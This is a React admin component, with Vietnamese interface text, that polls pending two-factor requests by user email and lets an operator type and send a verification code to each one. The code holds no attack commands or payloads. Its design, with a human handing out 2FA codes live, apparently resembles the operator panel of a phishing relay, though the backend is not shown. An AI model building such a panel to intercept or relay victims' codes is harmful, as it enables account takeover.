'use client';

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { RefreshCw, Send, Mail, Clock, ShieldAlert, CheckCircle2, User, Loader2 } from 'lucide-react';

interface PendingRequest {
  _id: string;
  email: string;
  status: string;
  updatedAt: string;
}

export default function Admin2FAManager() {
  const [requests, setRequests] = useState<PendingRequest[]>([]);
  const [loading, setLoading] = useState(true);
  const [codes, setCodes] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState<Record<string, boolean>>({});

  const fetchRequests = async () => {
    try {
      const res = await fetch('/api/2fa/admin/pending');
      const data = await res.json();
      if (Array.isArray(data)) {
        setRequests(data);
      }
    } catch (err) {
      console.error('Failed to fetch requests:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchRequests();
    const interval = setInterval(fetchRequests, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleCodeChange = (email: string, val: string) => {
    setCodes(prev => ({ ...prev, [email]: val }));
  };

  const handleSubmitCode = async (email: string) => {
    const code = codes[email];
    if (!code || code.length < 4) return;

    setIsSubmitting(prev => ({ ...prev, [email]: true }));

    try {
      const res = await fetch('/api/2fa/admin/respond', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, code }),
      });

      if (res.ok) {
        // Remove from list or trigger refresh
        setRequests(prev => prev.filter(r => r.email !== email));
      }
    } catch (err) {
      console.error('Failed to submit code:', err);
    } finally {
      setIsSubmitting(prev => ({ ...prev, [email]: false }));
    }
  };

  return (
    <main className="min-h-screen bg-[#f1f5f9] p-4 md:p-10 font-sans">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="flex flex-col md:flex-row md:items-center justify-between mb-10 gap-4">
          <div>
            <h1 className="text-3xl font-black text-slate-900 tracking-tight">2FA Response Manager</h1>
            <p className="text-slate-500 font-medium">Quản lý và cấp mã xác thực cho người dùng thời gian thực.</p>
          </div>
          <button 
            onClick={fetchRequests}
            className="flex items-center gap-2 px-5 py-2.5 bg-white border border-slate-200 rounded-xl text-slate-600 font-bold hover:bg-slate-50 transition-all shadow-sm"
          >
            <RefreshCw size={18} className={loading ? 'animate-spin' : ''} />
            Làm mới
          </button>
        </div>

        {/* Request List */}
        <div className="space-y-4">
          <AnimatePresence mode="popLayout">
            {requests.length === 0 ? (
              <motion.div 
                initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                className="bg-white rounded-3xl p-16 flex flex-col items-center justify-center text-center border border-slate-200 shadow-sm"
              >
                <div className="w-16 h-16 bg-slate-50 rounded-2xl flex items-center justify-center text-slate-300 mb-4">
                  <CheckCircle2 size={32} />
                </div>
                <h3 className="text-xl font-bold text-slate-800">Không có yêu cầu nào</h3>
                <p className="text-slate-400 max-w-xs mt-2">Tất cả người dùng đều đã được xử lý hoặc chưa có yêu cầu mới.</p>
              </motion.div>
            ) : (
              requests.map((req) => (
                <motion.div
                  key={req.email}
                  layout
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  className="bg-white rounded-2xl border border-slate-200 p-6 shadow-sm hover:shadow-md transition-shadow flex flex-col md:flex-row md:items-center gap-6"
                >
                  <div className="flex-1 space-y-2">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 bg-brand-50 rounded-xl flex items-center justify-center text-brand-500">
                        <User size={20} />
                      </div>
                      <div>
                        <h4 className="font-bold text-slate-900 break-all">{req.email}</h4>
                        <div className="flex items-center gap-2 text-slate-400 text-xs font-medium">
                          <Clock size={12} />
                          <span>Yêu cầu lúc: {new Date(req.updatedAt).toLocaleTimeString()}</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="flex items-center gap-3 w-full md:w-auto">
                    <input 
                      type="text"
                      placeholder="Nhập mã (VD: 123456)"
                      className="flex-1 md:w-48 h-12 bg-slate-50 border border-slate-200 rounded-xl px-4 font-mono font-bold text-ink focus:border-brand-500 focus:bg-white outline-none transition-all"
                      value={codes[req.email] || ''}
                      onChange={(e) => handleCodeChange(req.email, e.target.value)}
                    />
                    <button
                      disabled={!codes[req.email] || codes[req.email].length < 4 || isSubmitting[req.email]}
                      onClick={() => handleSubmitCode(req.email)}
                      className="h-12 px-6 bg-brand-600 text-white rounded-xl font-bold flex items-center gap-2 hover:bg-brand-700 active:scale-95 disabled:bg-slate-100 disabled:text-slate-300 transition-all shadow-lg shadow-brand-200"
                    >
                      {isSubmitting[req.email] ? <Loader2 size={18} className="animate-spin" /> : <><Send size={18} /><span>Gửi mã</span></>}
                    </button>
                  </div>
                </motion.div>
              ))
            )}
          </AnimatePresence>
        </div>
      </div>

      <style jsx global>{`
        body { background-color: #f1f5f9; }
      `}</style>
    </main>
  );
}
